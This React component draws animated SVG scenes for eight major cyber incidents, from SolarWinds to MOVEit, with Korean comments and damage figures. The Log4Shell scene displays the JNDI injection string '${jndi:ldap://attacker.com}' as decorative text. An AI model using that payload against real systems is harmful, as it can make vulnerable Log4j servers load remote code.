import { motion } from 'framer-motion';

// 각 사건별 고유 SVG 장면 일러스트 (8대 사고)
const illustrations = {
  // SolarWinds — 소프트웨어 공급망 공격
  'solarwinds-2020': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 소프트웨어 패키지 (감염된 업데이트) */}
      <rect x="25" y="30" width="35" height="40" rx="3" stroke={color} strokeWidth="1.5" opacity="0.5" />
      <motion.g
        animate={{ opacity: [0.3, 0.8, 0.3] }}
        transition={{ duration: 2, repeat: Infinity }}
      >
        <text x="42" y="48" fill={color} fontSize="6" fontFamily="monospace" textAnchor="middle" opacity="0.6">UPDATE</text>
        <text x="42" y="58" fill={color} fontSize="14" textAnchor="middle" opacity="0.4">&#x2193;</text>
      </motion.g>
      {/* 백도어 아이콘 */}
      <motion.circle
        cx="42" cy="55" r="0"
        stroke={color} fill="none" strokeWidth="1"
        animate={{ r: [0, 8, 0], opacity: [0.5, 0, 0.5] }}
        transition={{ duration: 2.5, repeat: Infinity }}
      />
      {/* 공급망 전파 화살표 */}
      <motion.path
        d="M60 50 Q80 30 100 35 Q120 40 140 30"
        stroke={color} strokeWidth="1.5" strokeDasharray="4 3" fill="none"
        animate={{ strokeDashoffset: [0, -14] }}
        transition={{ duration: 1.5, repeat: Infinity, ease: 'linear' }}
        opacity="0.5"
      />
      <motion.path
        d="M60 50 Q85 55 110 50 Q130 45 150 55"
        stroke={color} strokeWidth="1.5" strokeDasharray="4 3" fill="none"
        animate={{ strokeDashoffset: [0, -14] }}
        transition={{ duration: 1.5, repeat: Infinity, ease: 'linear', delay: 0.5 }}
        opacity="0.5"
      />
      <motion.path
        d="M60 50 Q80 70 105 65 Q125 60 145 75"
        stroke={color} strokeWidth="1.5" strokeDasharray="4 3" fill="none"
        animate={{ strokeDashoffset: [0, -14] }}
        transition={{ duration: 1.5, repeat: Infinity, ease: 'linear', delay: 1 }}
        opacity="0.5"
      />
      {/* 피해 조직들 */}
      {[
        { x: 145, y: 25 },
        { x: 160, y: 50 },
        { x: 150, y: 78 },
      ].map(({ x, y }, i) => (
        <g key={i}>
          <rect x={x - 8} y={y - 8} width="16" height="16" rx="2" stroke={color} strokeWidth="1" fill="none" opacity="0.4" />
          <motion.circle
            cx={x} cy={y} r="2" fill={color}
            animate={{ opacity: [0.2, 0.8, 0.2] }}
            transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.5 + 1 }}
          />
        </g>
      ))}
      <text x="155" y="95" fill={color} fontSize="7" fontFamily="monospace" opacity="0.4" textAnchor="middle">18,000+</text>
    </svg>
  ),

  // Log4Shell — 코드 인젝션 + 글로벌 영향
  'log4shell-2021': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 터미널 창 */}
      <rect x="15" y="15" width="85" height="55" rx="4" stroke={color} strokeWidth="1.5" opacity="0.4" />
      <rect x="15" y="15" width="85" height="10" rx="4" fill={color} opacity="0.1" />
      <circle cx="23" cy="20" r="2" fill={color} opacity="0.4" />
      <circle cx="30" cy="20" r="2" fill={color} opacity="0.3" />
      {/* JNDI 인젝션 코드 */}
      <motion.g
        animate={{ opacity: [0.3, 0.9, 0.3] }}
        transition={{ duration: 2.5, repeat: Infinity }}
      >
        <text x="22" y="37" fill={color} fontSize="5" fontFamily="monospace" opacity="0.7">$&#123;jndi:ldap://</text>
        <text x="22" y="46" fill={color} fontSize="5" fontFamily="monospace" opacity="0.6">attacker.com&#125;</text>
      </motion.g>
      {/* 경고 아이콘 */}
      <motion.g
        animate={{ scale: [1, 1.2, 1], opacity: [0.5, 0.9, 0.5] }}
        transition={{ duration: 1.5, repeat: Infinity }}
        style={{ transformOrigin: '57px 58px' }}
      >
        <polygon points="57,50 48,66 66,66" stroke={color} strokeWidth="1.5" fill="none" opacity="0.6" />
        <text x="57" y="63" fill={color} fontSize="9" textAnchor="middle" fontWeight="bold" opacity="0.7">!</text>
      </motion.g>
      {/* 확산 파동 (글로벌) */}
      {[0, 0.6, 1.2].map((delay, i) => (
        <motion.circle
          key={i}
          cx="145" cy="50" r="0"
          stroke={color} strokeWidth="1" fill="none"
          animate={{ r: [5, 35], opacity: [0.5, 0] }}
          transition={{ duration: 2, repeat: Infinity, delay }}
        />
      ))}
      {/* 서버 아이콘들 */}
      {[
        { x: 130, y: 25 },
        { x: 165, y: 35 },
        { x: 155, y: 65 },
        { x: 125, y: 70 },
      ].map(({ x, y }, i) => (
        <motion.rect
          key={i}
          x={x - 5} y={y - 4} width="10" height="8" rx="1"
          stroke={color} strokeWidth="1" fill="none"
          animate={{ opacity: [0.2, 0.7, 0.2] }}
          transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.3 }}
        />
      ))}
      <text x="145" y="92" fill={color} fontSize="7" fontFamily="monospace" opacity="0.4" textAnchor="middle">93%</text>
    </svg>
  ),

  // WannaCry — 자물쇠와 글로브
  'wannacry-ia': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 지구 */}
      <circle cx="100" cy="50" r="35" stroke={color} strokeWidth="1.5" opacity="0.3" />
      <ellipse cx="100" cy="50" rx="20" ry="35" stroke={color} strokeWidth="1" opacity="0.2" />
      <line x1="65" y1="50" x2="135" y2="50" stroke={color} strokeWidth="1" opacity="0.2" />
      <line x1="72" y1="30" x2="128" y2="30" stroke={color} strokeWidth="1" opacity="0.15" />
      <line x1="72" y1="70" x2="128" y2="70" stroke={color} strokeWidth="1" opacity="0.15" />
      {/* 자물쇠들 (감염 확산) */}
      {[
        { x: 80, y: 30, delay: 0 },
        { x: 120, y: 35, delay: 0.3 },
        { x: 70, y: 60, delay: 0.6 },
        { x: 130, y: 65, delay: 0.9 },
        { x: 100, y: 75, delay: 1.2 },
      ].map(({ x, y, delay }, i) => (
        <motion.g
          key={i}
          initial={{ opacity: 0, scale: 0 }}
          animate={{ opacity: [0, 0.8, 0.5], scale: [0, 1.2, 1] }}
          transition={{ duration: 0.6, delay, repeat: Infinity, repeatDelay: 2.5 }}
        >
          <rect x={x - 4} y={y} width="8" height="6" rx="1" fill={color} opacity="0.7" />
          <path d={`M${x - 2} ${y} V${y - 3} a2 2 0 0 1 4 0 V${y}`} stroke={color} strokeWidth="1.2" fill="none" />
        </motion.g>
      ))}
    </svg>
  ),

  // Colonial Pipeline — 파이프라인 인프라 셧다운
  'colonial-2021': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 파이프라인 */}
      <rect x="10" y="42" width="180" height="16" rx="3" stroke={color} strokeWidth="1.5" opacity="0.3" />
      {/* 연료 흐름 (중단됨) */}
      <motion.rect
        x="12" y="44" width="60" height="12" rx="2"
        fill={color} opacity="0.15"
        animate={{ width: [60, 80, 60] }}
        transition={{ duration: 3, repeat: Infinity }}
      />
      {/* 차단 표시 (X) */}
      <motion.g
        animate={{ opacity: [0.4, 0.9, 0.4] }}
        transition={{ duration: 1.5, repeat: Infinity }}
      >
        <circle cx="100" cy="50" r="12" stroke={color} strokeWidth="2" opacity="0.6" />
        <line x1="92" y1="42" x2="108" y2="58" stroke={color} strokeWidth="2" opacity="0.7" />
        <line x1="108" y1="42" x2="92" y2="58" stroke={color} strokeWidth="2" opacity="0.7" />
      </motion.g>
      {/* 주유소 아이콘 */}
      <g opacity="0.4">
        <rect x="145" y="22" width="20" height="30" rx="2" stroke={color} strokeWidth="1" fill="none" />
        <rect x="148" y="26" width="14" height="8" rx="1" stroke={color} strokeWidth="0.8" fill="none" />
        <line x1="155" y1="52" x2="155" y2="42" stroke={color} strokeWidth="1" />
      </g>
      {/* 경고 텍스트 */}
      <motion.text
        x="155" y="68" fill={color} fontSize="6" fontFamily="monospace" textAnchor="middle"
        animate={{ opacity: [0, 0.7, 0] }}
        transition={{ duration: 2, repeat: Infinity }}
      >SHUTDOWN</motion.text>
      {/* 비트코인 */}
      <motion.g
        animate={{ y: [0, -3, 0] }}
        transition={{ duration: 2, repeat: Infinity }}
      >
        <circle cx="40" cy="25" r="8" stroke={color} strokeWidth="1" fill="none" opacity="0.4" />
        <text x="40" y="29" fill={color} fontSize="10" textAnchor="middle" opacity="0.5">&#x20bf;</text>
      </motion.g>
      <text x="40" y="85" fill={color} fontSize="7" fontFamily="monospace" opacity="0.4" textAnchor="middle">$4.4M</text>
    </svg>
  ),

  // Stuxnet — 원심분리기 + 디지털 방패 관통
  'stuxnet-evasion': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 원심분리기 */}
      <motion.g
        animate={{ rotate: [0, 360] }}
        transition={{ duration: 4, repeat: Infinity, ease: 'linear' }}
        style={{ transformOrigin: '60px 50px' }}
      >
        <circle cx="60" cy="50" r="20" stroke={color} strokeWidth="1" opacity="0.3" />
        <line x1="60" y1="30" x2="60" y2="70" stroke={color} strokeWidth="1" opacity="0.3" />
        <line x1="40" y1="50" x2="80" y2="50" stroke={color} strokeWidth="1" opacity="0.3" />
      </motion.g>
      <circle cx="60" cy="50" r="3" fill={color} opacity="0.5" />
      {/* 방패 (관통됨) */}
      <path d="M130 25 L130 55 Q130 70 150 80 Q170 70 170 55 L170 25 L150 18 Z" stroke={color} strokeWidth="1.5" fill="none" opacity="0.4" />
      {/* 관통 화살표 */}
      <motion.g
        animate={{ x: [-30, 10], opacity: [0.8, 0.2] }}
        transition={{ duration: 2, repeat: Infinity, ease: 'easeIn' }}
      >
        <line x1="100" y1="50" x2="140" y2="50" stroke={color} strokeWidth="2" opacity="0.7" />
        <polygon points="140,46 148,50 140,54" fill={color} opacity="0.7" />
      </motion.g>
      {/* 제로데이 표시 */}
      <text x="150" y="40" fill={color} fontSize="7" fontFamily="monospace" opacity="0.4" textAnchor="middle">0-day x4</text>
      {/* 글리치 효과 */}
      <motion.rect
        x="125" y="48" width="50" height="2"
        fill={color} opacity="0"
        animate={{ opacity: [0, 0.3, 0], x: [125, 130, 125] }}
        transition={{ duration: 0.3, repeat: Infinity, repeatDelay: 3 }}
      />
    </svg>
  ),

  // NotPetya — 파괴적 와이퍼 + 네트워크 확산
  'notpetya-2017': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 중앙 파괴 아이콘 */}
      <motion.g
        animate={{ rotate: [0, 10, -10, 0] }}
        transition={{ duration: 3, repeat: Infinity }}
        style={{ transformOrigin: '60px 50px' }}
      >
        <circle cx="50" cy="50" r="10" stroke={color} strokeWidth="2" opacity="0.6" />
        <circle cx="50" cy="50" r="4" fill={color} opacity="0.3" />
        <line x1="60" y1="50" x2="80" y2="50" stroke={color} strokeWidth="2" opacity="0.6" />
        <line x1="72" y1="50" x2="72" y2="56" stroke={color} strokeWidth="2" opacity="0.5" />
        <line x1="78" y1="50" x2="78" y2="54" stroke={color} strokeWidth="2" opacity="0.5" />
      </motion.g>
      {/* 확산 네트워크 */}
      {[
        { x: 130, y: 20 },
        { x: 160, y: 45 },
        { x: 145, y: 75 },
        { x: 175, y: 25 },
        { x: 180, y: 70 },
      ].map(({ x, y }, i) => (
        <g key={i}>
          <motion.line
            x1="80" y1="50" x2={x} y2={y}
            stroke={color} strokeWidth="0.8"
            strokeDasharray="3 2"
            animate={{ strokeDashoffset: [0, -10], opacity: [0.2, 0.5, 0.2] }}
            transition={{ duration: 2, repeat: Infinity, delay: i * 0.4 }}
          />
          <motion.circle
            cx={x} cy={y} r="5"
            stroke={color} strokeWidth="1" fill="none"
            animate={{ r: [4, 6, 4], opacity: [0.3, 0.6, 0.3] }}
            transition={{ duration: 2, repeat: Infinity, delay: i * 0.4 }}
          />
          <motion.circle
            cx={x} cy={y} r="2" fill={color}
            animate={{ opacity: [0.2, 0.7, 0.2] }}
            transition={{ duration: 2, repeat: Infinity, delay: i * 0.4 }}
          />
        </g>
      ))}
      <text x="150" y="95" fill={color} fontSize="8" fontFamily="monospace" opacity="0.4" textAnchor="middle">$10B+</text>
    </svg>
  ),

  // Equifax — 데이터베이스에서 개인정보 유출
  'equifax-2017': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 데이터베이스 실린더 */}
      <ellipse cx="55" cy="25" rx="25" ry="8" stroke={color} strokeWidth="1.5" opacity="0.5" />
      <rect x="30" y="25" width="50" height="40" stroke={color} strokeWidth="1.5" fill="none" opacity="0.4" />
      <ellipse cx="55" cy="65" rx="25" ry="8" stroke={color} strokeWidth="1.5" opacity="0.5" />
      <ellipse cx="55" cy="40" rx="25" ry="8" stroke={color} strokeWidth="0.8" opacity="0.2" />
      <ellipse cx="55" cy="52" rx="25" ry="8" stroke={color} strokeWidth="0.8" opacity="0.2" />
      {/* DB 안의 텍스트 */}
      <text x="55" y="35" fill={color} fontSize="5" fontFamily="monospace" textAnchor="middle" opacity="0.4">SSN</text>
      <text x="55" y="47" fill={color} fontSize="5" fontFamily="monospace" textAnchor="middle" opacity="0.3">ADDR</text>
      <text x="55" y="59" fill={color} fontSize="5" fontFamily="monospace" textAnchor="middle" opacity="0.3">CC#</text>
      {/* 유출 데이터 스트림 */}
      {[
        { y: 30, delay: 0 },
        { y: 42, delay: 0.4 },
        { y: 55, delay: 0.8 },
      ].map(({ y, delay }, i) => (
        <motion.g key={i}>
          <motion.path
            d={`M80 ${y} Q110 ${y - 5 + i * 3} 140 ${y - 2 + i * 4} Q160 ${y + i * 3} 185 ${y + 5}`}
            stroke={color} strokeWidth="1.2" strokeDasharray="4 3" fill="none"
            animate={{ strokeDashoffset: [0, -14] }}
            transition={{ duration: 1.3, repeat: Infinity, ease: 'linear', delay }}
            opacity="0.5"
          />
          <motion.circle
            cx="185" cy={y + 5} r="2" fill={color}
            animate={{ opacity: [0, 0.7, 0] }}
            transition={{ duration: 1.3, repeat: Infinity, delay: delay + 0.8 }}
          />
        </motion.g>
      ))}
      {/* 피해 규모 */}
      <motion.text
        x="155" y="85" fill={color} fontSize="7" fontFamily="monospace" textAnchor="middle"
        animate={{ opacity: [0.3, 0.7, 0.3] }}
        transition={{ duration: 2, repeat: Infinity }}
      >147M</motion.text>
    </svg>
  ),

  // MOVEit — 파일 전송 + 대규모 탈취
  'moveit-2023': ({ color }) => (
    <svg viewBox="0 0 200 100" fill="none" className="w-full h-full">
      {/* 파일 전송 서버 */}
      <rect x="20" y="25" width="45" height="50" rx="4" stroke={color} strokeWidth="1.5" opacity="0.4" />
      <text x="42" y="40" fill={color} fontSize="5" fontFamily="monospace" textAnchor="middle" opacity="0.5">MOVEit</text>
      {/* 파일 아이콘들 */}
      {[32, 44, 56].map((y, i) => (
        <motion.g key={i}>
          <rect x="28" y={y} width="12" height="9" rx="1" stroke={color} strokeWidth="0.8" fill="none" opacity="0.3" />
          <motion.rect
            x="28" y={y} width="12" height="9" rx="1"
            fill={color} opacity="0"
            animate={{ opacity: [0, 0.15, 0] }}
            transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.4 }}
          />
        </motion.g>
      ))}
      {/* SQL 인젝션 화살표 */}
      <motion.g
        animate={{ x: [-5, 5, -5] }}
        transition={{ duration: 2, repeat: Infinity }}
      >
        <polygon points="72,42 80,50 72,58" fill={color} opacity="0.5" />
        <text x="90" y="48" fill={color} fontSize="5" fontFamily="monospace" opacity="0.5">SQL</text>
        <text x="90" y="56" fill={color} fontSize="4" fontFamily="monospace" opacity="0.4">0-day</text>
      </motion.g>
      {/* 탈취된 데이터 흐름 */}
      {[0, 0.5, 1].map((delay, i) => (
        <motion.path
          key={i}
          d={`M105 ${42 + i * 8} Q130 ${38 + i * 10} 160 ${35 + i * 12}`}
          stroke={color} strokeWidth="1.2" strokeDasharray="3 3" fill="none"
          animate={{ strokeDashoffset: [0, -12] }}
          transition={{ duration: 1.2, repeat: Infinity, ease: 'linear', delay }}
          opacity="0.4"
        />
      ))}
      {/* 피해 조직 아이콘들 */}
      {[
        { x: 165, y: 25, label: 'DOE' },
        { x: 180, y: 45, label: 'BBC' },
        { x: 170, y: 70, label: 'BA' },
      ].map(({ x, y, label }, i) => (
        <g key={i}>
          <motion.rect
            x={x - 10} y={y - 6} width="20" height="12" rx="2"
            stroke={color} strokeWidth="0.8" fill="none"
            animate={{ opacity: [0.2, 0.6, 0.2] }}
            transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.4 + 0.5 }}
          />
          <text x={x} y={y + 2} fill={color} fontSize="5" fontFamily="monospace" textAnchor="middle" opacity="0.4">{label}</text>
        </g>
      ))}
      <text x="100" y="92" fill={color} fontSize="7" fontFamily="monospace" opacity="0.4" textAnchor="middle">2,773+</text>
    </svg>
  ),
};

export default function IncidentIllustration({ incidentId, color, isActive }) {
  const Illustration = illustrations[incidentId];
  if (!Illustration) return null;

  return (
    <motion.div
      className="w-full h-16 md:h-20 mt-1"
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: isActive ? 1 : 0, scale: isActive ? 1 : 0.9 }}
      transition={{ duration: 0.4, delay: 0.2 }}
    >
      <Illustration color={color} />
    </motion.div>
  );
}
